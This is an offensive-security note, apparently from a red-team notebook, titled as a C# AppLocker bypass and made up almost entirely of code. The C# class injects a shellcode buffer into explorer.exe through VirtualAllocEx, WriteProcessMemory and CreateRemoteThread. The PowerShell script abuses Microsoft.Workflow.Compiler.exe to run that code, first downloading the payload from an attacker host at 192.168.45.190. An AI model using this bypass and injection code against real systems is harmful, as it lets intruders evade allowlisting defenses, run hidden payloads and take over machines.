---
title: CSharp AppLocker bypass
tags:
  - breach
  - operations
  - applocker
  - bypass
  - allowlist
  - csharp
  - whitelist
---

```csharp
﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Workflow.ComponentModel;
public class Run : Activity {
  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
  static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
                                   int processId);
  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
  static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
                                      uint dwSize, uint flAllocationType,
                                      uint flProtect);
  [DllImport("kernel32.dll")]
  static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
                                        byte[] lpBuffer, Int32 nSize,
                                        out IntPtr lpNumberOfBytesWritten);
  [DllImport("kernel32.dll")]
  static extern IntPtr
  CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
                     uint dwStackSize, IntPtr lpStartAddress,
                     IntPtr lpParameter, uint dwCreationFlags,
                     IntPtr lpThreadId);
  public Run() {
    int explorerId = Process.GetProcessesByName("explorer")[0].Id;
    IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerId);
    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    byte[] buf = new byte[854] {
      0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
      // ...
      0xff, 0xd5
    };
    IntPtr outSize;
    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
                                        IntPtr.Zero, 0, IntPtr.Zero);
  }
}
```

```powershell
$workflowProgram = (Get-ChildItem `
	-ErrorAction SilentlyContinue `
	-Path "C:\Windows" `
	-Filter "Microsoft.Workflow.Compiler.exe" `
	-Recurse `
	-File | Where-Object {$_.FullName -Like "*Framework64\v4*"}).FullName

$workflowAsm = [Reflection.Assembly]::LoadFrom($workflowProgram)

$serializeInputToWrapper = `
	[Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod(
		'SerializeInputToWrapper',
		[Reflection.BindingFlags] 'NonPublic, Static'
	)

$workflowLibrary = (Get-ChildItem `
	-ErrorAction SilentlyContinue `
	-Path "C:\Windows" `
	-Filter "System.Workflow.ComponentModel.dll" `
	-Recurse `
	-File | Where-Object {$_.FullName -Like "*Framework64\v4*"}).FullName

Add-Type -Path $workflowLibrary

$compilerParam = New-Object `
	-TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters

$compilerParam.GenerateInMemory = $True
$pathVar = "payload.txt"
$output = (Join-Path -Path (Resolve-Path -Path .).Path -ChildPath "run.xml")

$tmp = $serializeInputToWrapper.Invoke(
	$null,
	@(
		[Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerParam,
		[String[]] @(,$pathVar)
	)
)

Move-Item $tmp $output
$lHost = "192.168.45.190"
$lPort = "80"

Invoke-RestMethod `
	-Uri "http://${lHost}:${lPort}/$pathVar" `
	-UseBasicParsing `
	-OutFile $pathVar

. $workflowProgram $output "results.xml"
```
